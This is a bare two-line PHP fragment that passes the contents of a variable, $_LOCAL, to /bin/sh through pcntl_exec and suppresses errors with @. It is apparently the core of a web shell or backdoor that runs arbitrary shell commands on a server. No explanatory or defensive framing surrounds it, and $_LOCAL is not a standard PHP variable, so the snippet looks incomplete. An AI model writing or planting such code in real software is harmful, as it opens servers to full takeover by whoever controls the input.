$exec = $_LOCAL;
@pcntl_exec('/bin/sh', array('-c',$exec));